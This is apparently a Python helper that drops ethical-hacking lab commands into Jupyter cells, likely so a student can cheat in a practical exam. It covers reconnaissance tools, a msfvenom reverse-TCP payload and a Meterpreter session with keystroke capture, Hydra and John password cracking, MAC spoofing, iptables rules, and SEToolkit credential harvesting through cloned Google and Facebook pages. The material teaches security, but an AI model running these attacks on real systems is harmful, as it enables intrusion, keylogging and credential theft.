from IPython.display import Javascript, display

# import footPrinting
# import hackWindows
# import passwordCrack
# import macChanger
# import iptables
# import phishing

def footPrinting():
    return [
        """
        2. Foot printing Tools -recon-ng, Dmitry, netdiscover, nmap.
        """,
        """recon-ng commands""",
        """What is recon-ng?
        It’s a reconnaissance (information gathering) framework with a console interface similar to
        Metasploit.
        It automates gathering info like hosts, emails, subdomains from the internet.
        
        Commands explained
        ➡ Open recon-ng
                ➢ recon-ng
            • Starts the recon-ng console. You get a prompt similar to recon-ng .
        
        ➡ Install marketplace modules
            ➢ marketplace install recon/domains-hosts/netcraft
            ➢ marketplace install recon/hosts-hosts/resolve
            ➢ marketplace install recon/domains-hosts/hackertarget
            ➢ marketplace install recon/domains-contacts/whois_pocs
        • Downloads & installs extra modules from the recon-ng repository so you can use them later.
        • Each module is like a plugin for specific tasks (finding hosts, emails, whois data).    
        """,
        """
        ➡ Using Netcraft module
            ➢ modules load recon/domains-hosts/netcraft
            ➢ info
            ➢ options set SOURCE google.com
            ➢ run
        • modules load recon/domains-hosts/netcraft — Loads the Netcraft module which collects
        hosts for a given domain using Netcraft data.
        • info — Shows info about the loaded module (author, what it does, options it needs).
        • options set SOURCE google.com — Sets the domain you want to scan (target).
        • run — Executes the module, starts gathering data
        """,
        """
        ➡ Using Resolve module
            ➢ modules load recon/hosts-hosts/resolve
            ➢ info
            ➢ options set SOURCE facebook.com
            ➢ run
        • This module resolves hostnames to IP addresses.
        • The same info, options set, run pattern applies.
        """,
        """
        ➡ Using Hackertarget module
            ➢ modules load recon/domains-hosts/hackertarget
            ➢ info
            ➢ options set SOURCE facebook.com
            ➢ run
        • Uses HackerTarget API to find hosts and subdomains linked to the target domain.
        """,
        """
        ➡ Using whois_pocs module
            ➢ modules load recon/domains-contacts/whois_pocs
            ➢ info
            ➢ options set SOURCE facebook.com
            ➢ run
        • Finds whois "point of contact" emails or admin names for the target domain.
        """,
        """ """,
        """ 
         B. nmap commands
        """,
        """
         What is nmap?
        Nmap (Network Mapper) is a command-line tool to scan IP addresses or networks.
        It tells you which hosts are live, which ports are open, what services & versions they’re running,
        and sometimes the OS.
        Commands explained
        ➡ Simple scan with URL
            ➢ nmap www.gmail.com
        • Looks up the IP of www.gmail.com and does a default port scan (top 1000 ports).
        • Lists open ports & services.
        """,
        """
        ➡ Detect Operating System
            ➢ nmap -O <ipaddress>
        ➢ To know the ip address use command: ifconfig
        • -O tries to guess the operating system based on TCP/IP fingerprints.
        • Useful to know if target runs Windows, Linux, etc.
        """,
        """
        ➡ Check a single port
            ➢ nmap -p 80 <ipaddress>
        • -p 80 restricts the scan to only port 80 (HTTP).
        • Quickly checks if the web server port is open.
        """,
        """
        ➡ Check multiple specific ports
            ➢ nmap -p 21,80,8080 <ipaddress>
        • -p 21,80,8080 tells nmap to check FTP (21), HTTP (80), alternative HTTP (8080).
        """,
        """
        ➡ Scan all 65535 ports
            ➢ nmap -p- <ipaddress>
        • -p- means scan all ports from 1 to 65535.
        • Very thorough but slower.
        """,
        """
        ➡ Find live hosts in network
            ➢ nmap -sn <ipaddress>
        • -sn disables port scanning, only does a ping sweep to see which hosts respond.
        • Used for network discovery.
        """,
        """
        ➡ Scan for firewalls (ACK scan)
            ➢ nmap -sA <ipaddress>
        • -sA sends ACK packets to map firewall rules.
        • Used to see if a firewall is filtering ports (detects if stateful firewall is present).
        """,
        """""",
        """ C. Dmitry commands""",
        """
         What is dmitry?
        Dmitry (Deepmagic Information Gathering Tool) is a CLI tool that collects information like IP address,
        whois, subdomains, emails, and scans ports.
        Command explained
            ➢ dmitry -winsepo google.com
        • Options:
            // do not press that 0 idiot
            o -w does whois lookup.
            o -i gets target IP address.
            o -n gets Netcraft info.
            o -s searches for subdomains.
            o -e looks for email addresses.
            o -p scans TCP ports.
            o -o writes all output to a file (needs filename).
        Example to save to file:
        ➢ dmitry -winsepo google.com -o result.txt
        • Saves the entire output to result.txt.
        """,
        """ """,
        """ D. netdiscover commands """,
        """
        What is netdiscover?
        Netdiscover is a tool that performs ARP scanning to find live hosts on a local network — showing
        their IP and MAC addresses.
        
        Commands explained
        ➡ Simple scan
            ➢ netdiscover
        • Starts scanning on the default interface, looks for nearby live hosts.
        """,
        """
        ➡ Scan specific subnet
            ➢ netdiscover -r 192.168.153.0/16
        • -r specifies a network range to scan.
        • Here /16 means scan all IPs from 192.168.0.0 to 192.168.255.255.
        """
    ]



def print_codes(codes):
    codes = codes[::-1]

    for code in codes:
        js_code = f'''
        var cell = Jupyter.notebook.insert_cell_below('code');
        cell.set_text(`{code}`);
        '''
        display(Javascript(js_code))

def hackWindows():
    return [
        """

---------------------------
Lab Practical - 3 Commands.
---------------------------

┌──(root㉿kali)-[~]
└─# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.44.128  netmask 255.255.255.0  broadcast 192.168.44.255
        inet6 fe80::20c:29ff:fe65:1d94  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:65:1d:94  txqueuelen 1000  (Ethernet)
        RX packets 69  bytes 6405 (6.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 35  bytes 4357 (4.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp -f exe -o venom.exe lhost=192.168.75.255 lport=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: venom.exe
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# sudo service apache2 start 
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# msfconsole
Metasploit tip: View advanced module options with advanced
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                                                                                               
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                                                                                              
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                                                                                              
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                                                                                             
                                                                                                                                                                           

       =[ metasploit v6.4.9-dev                           ]
+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]
                          ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.75.128
lhost => 192.168.75.128
msf6 exploit(multi/handler) > exploit

[-] Handler failed to bind to 192.168.75.128:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Sending stage (176198 bytes) to 192.168.44.129
[*] Meterpreter session 1 opened (192.168.44.128:4444 -> 192.168.44.129:49169) at 2025-07-15 12:30:32 +0530

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    show_mount                List all mount points/logical drives
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    enumdesktops              List all accessible desktops and window stations
    getdesktop                Get the current meterpreter desktop
    idletime                  Returns the number of seconds the remote user has been idle
    keyboard_send             Send keystrokes
    keyevent                  Send key events
    keyscan_dump              Dump the keystroke buffer
    keyscan_start             Start capturing keystrokes
    keyscan_stop              Stop capturing keystrokes
    mouse                     Send mouse events
    screenshare               Watch the remote user desktop in real time
    screenshot                Grab a screenshot of the interactive desktop
    setdesktop                Change the meterpreters current desktop
    uictl                     Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default microphone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                   Description
    -------                   -----------
    getsystem                 Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                   Description
    -------                   -----------
    hashdump                  Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                   Description
    -------                   -----------
    timestomp                 Manipulate file MACE attributes

For more info on a specific command, use <command> -h or help <command>.

meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
rvr <Right Shift>&jc college of engineerinh<^H>g

meterpreter > uictl disable keyboard
Disabling keyboard...
meterpreter > uictl enable keyboard
Enabling keyboard...

================================================================================================

"""
    ]

def passwordCrack():
    return [
        """

===================================================
5 a) Online Password Cracking with Hydra, xHydra.
==================================================

──(mohan㉿kali)-[~]
└─$ hydra -l msfadmin -P eh.txt ftp://192.168.44.131
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-23 09:28:20
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:1/p:9), ~1 try per task
[DATA] attacking ftp://192.168.44.131:21/
[21][ftp] host: 192.168.44.131   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-23 09:28:24
                                                                             
┌──(mohan㉿kali)-[~]
└─$ xhydra

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: GFileInfo created without time::modified

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: file ../../../gio/gfileinfo.c: line 1887 (g_file_info_get_modification_time): should not be reached

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: GFileInfo created without time::modified

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: file ../../../gio/gfileinfo.c: line 1887 (g_file_info_get_modification_time): should not be reached

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: GFileInfo created without time::modified

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.093: file ../../../gio/gfileinfo.c: line 1887 (g_file_info_get_modification_time): should not be reached

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.094: GFileInfo created without time::modified

(xhydra:4435): GLib-GIO-CRITICAL **: 09:29:18.094: file ../../../gio/gfileinfo.c: line 1887 (g_file_info_get_modification_time): should not be reached


====================================================
5 b) Offline Password Cracking with John the ripper
====================================================

┌──(mohan㉿kali)-[~]
└─$ john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ echo -n "password" |md5sum
5f4dcc3b5aa765d61d8327deb882cf99  -
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ echo " 5f4dcc3b5aa765d61d8327deb882cf99" >hash.txt
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ cat hash.txt
 5f4dcc3b5aa765d61d8327deb882cf99
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ echo -e " abc\n12345678\nuser\npassword\npass123" > normal.txt
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ cat normal.txt
 abc
12345678
user
password
pass123
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ john --format=raw-md5 normal.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
password         (?)     
1g 0:00:00:00 DONE 2/3 (2025-07-29 10:38) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..larry
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                          
┌──(mohan㉿kali)-[~]
└─$ 



"""
    ]

def macChanger():
    return [
        """

zsh: corrupt history file /home/mohan/.zsh_history
                                                                             ┌──(mohan㉿kali)-[~]
└─$ ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.80.129  netmask 255.255.255.0  broadcast 192.168.80.255
        inet6 fe80::20c:29ff:fedc:524c  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:dc:52:4c  txqueuelen 1000  (Ethernet)
        RX packets 127  bytes 8940 (8.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 42  bytes 4787 (4.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                             
┌──(mohan㉿kali)-[~]
└─$ ip a    
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:dc:52:4c brd ff:ff:ff:ff:ff:ff
    inet 192.168.80.129/24 brd 192.168.80.255 scope global dynamic noprefixroute eth0
       valid_lft 1080sec preferred_lft 1080sec
    inet6 fe80::20c:29ff:fedc:524c/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
                                                                                                                                                                           
┌──(mohan㉿kali)-[~]
└─$ sudo ifconfig eth0 down    

[sudo] password for mohan: 
                                                                                                                                                                           
┌──(mohan㉿kali)-[~]
└─$ macchanger -r eth0 

Current MAC:   00:0c:29:dc:52:4c (VMware, Inc.)
Permanent MAC: 00:0c:29:dc:52:4c (VMware, Inc.)
[ERROR] Could not change MAC: interface up or insufficient permissions: Operation not permitted
                                                                                                                                                                           
┌──(mohan㉿kali)-[~]
└─$ sudo macchanger -r eth0

Current MAC:   00:0c:29:dc:52:4c (VMware, Inc.)
Permanent MAC: 00:0c:29:dc:52:4c (VMware, Inc.)
New MAC:       36:0d:29:8c:d4:dc (unknown)
                                                                                                                                                                           
┌──(mohan㉿kali)-[~]
└─$ sudo ifconfig eth0 up  
                                                                                                                                                                           
┌──(mohan㉿kali)-[~]
└─$ sudo macchanger -s eth0
Current MAC:   36:0d:29:8c:d4:dc (unknown)
Permanent MAC: 00:0c:29:dc:52:4c (VMware, Inc.)
                                                                                                                                                                           
┌──(mohan㉿kali)-[~]
└─$ 

"""
    ]

def iptables():
    return [
        """

===================================================
9. Linux Firewall rules configuration by Iptables
===================================================
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -L

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -L -n -v

Chain INPUT (policy ACCEPT 95 packets, 13869 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 29 packets, 2018 bytes)
 pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -A INPUT -s 157.240.7.35 -j DROP

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers

Chain INPUT (policy ACCEPT 95 packets, 13869 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1        0     0 DROP       0    --  *      *       157.240.7.35         0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 29 packets, 2018 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -F

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers

Chain INPUT (policy ACCEPT 95 packets, 13869 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 29 packets, 2018 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# host -t a www.facebook.com

www.facebook.com is an alias for star-mini.c10r.facebook.com.
star-mini.c10r.facebook.com has address 157.240.242.35
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# whois 157.240.242.35 | grep CIDR

CIDR:           157.240.0.0/16
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -A OUTPUT -d 157.240.0.0/16 -j DROP

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers            

Chain INPUT (policy ACCEPT 103 packets, 16148 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 38 packets, 2480 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1        0     0 DROP       0    --  *      *       0.0.0.0/0            157.240.0.0/16      
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -D OUTPUT 1            
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers

Chain INPUT (policy ACCEPT 103 packets, 16148 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 38 packets, 2480 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -D INPUT 3

iptables: Index of deletion too big.
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -A INPUT -j DROP -p tcp -i eth0

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers        

Chain INPUT (policy ACCEPT 104 packets, 16476 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1        0     0 DROP       6    --  eth0   *       0.0.0.0/0            0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 39 packets, 2790 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -D INPUT 1            
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers

Chain INPUT (policy ACCEPT 104 packets, 16476 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 39 packets, 2790 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -A INPUT -j DROP -p icmp -i eth0

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers         

Chain INPUT (policy ACCEPT 104 packets, 16476 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1        0     0 DROP       1    --  eth0   *       0.0.0.0/0            0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 39 packets, 2790 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -D INPUT 1                      
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers

Chain INPUT (policy ACCEPT 104 packets, 16476 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 39 packets, 2790 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -A INPUT -i eth0 -j ACCEPT -p tcp -s 157.240.0.0/16

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers                            

Chain INPUT (policy ACCEPT 104 packets, 16476 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1        0     0 ACCEPT     6    --  eth0   *       157.240.0.0/16       0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 39 packets, 2790 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers

Chain INPUT (policy ACCEPT 104 packets, 16476 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1        0     0 ACCEPT     6    --  eth0   *       157.240.0.0/16       0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 39 packets, 2790 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers                            

Chain INPUT (policy ACCEPT 104 packets, 16476 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1        0     0 ACCEPT     6    --  eth0   *       157.240.0.0/16       0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 39 packets, 2790 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# 

iptables -A INPUT -i eth0 -j DROP -p tcp -s 157.240.0.0/16

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers

Chain INPUT (policy ACCEPT 104 packets, 16476 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1        0     0 ACCEPT     6    --  eth0   *       157.240.0.0/16       0.0.0.0/0           
2        0     0 DROP       6    --  eth0   *       157.240.0.0/16       0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 39 packets, 2790 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -F

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# iptables -n -L -v --line-numbers

Chain INPUT (policy ACCEPT 104 packets, 16476 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 39 packets, 2790 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# 

============================================================================================

"""
    ]

def phishing():
    return [
        """

Open Terminal and enter following command
>>> setoolkit

• Choose Social –Engineering Attacks by giving “1”
• Choose Website Attack Vectors by giving “2”
• Choose Credential Harvester Attack Method by giving “3”
• Choose Web Templates by giving “1”
• Choose Google Website by giving “2”
• Open browser and enter IPAddress

it opens google
• Enter your details
• Close the Terminal and repeat the above steps until Credential Harvester Attack

• Choose Site Cloner by giving “2”
Enter a website link : www.facebook.com

• Open browser and enter IPAddress and enter details.


"""
    ]

def code(program):
    if program == "2":
        codes = footPrinting()
    elif program == "3":
        codes = hackWindows()
    elif program == "5":
        codes = passwordCrack()
    elif program == "6":
        codes = macChanger()
    elif program == "9":
        codes = iptables()
    elif program == "10":
        codes = phishing()
    elif program == "doree":
        codes = [
            """
Practical - 2 ~ Foot printing Tools : : a)Recon-ng b)Netdiscover c) Nmap d)Dmitry
Practical - 3 ~ Hacking any windows OS by using Metasploit Framework & Malware.
Practical - 6 ~ Mac Changer to Change the (MAC) Address of your Wi-Fi Card
Practical - 5 ~ (a). Online Password Cracking with Hydra, xHydra. (b). Offline Password Cracking with John the ripper.
Practical - 9 ~ Linux Firewall rules configuration by Iptables.
Practical - 10 ~ Phishing attacks with SEToolkit.
"""
        ]
    else:
        codes = ["""Consult HOD for correct cheat code"""]

    print_codes(codes)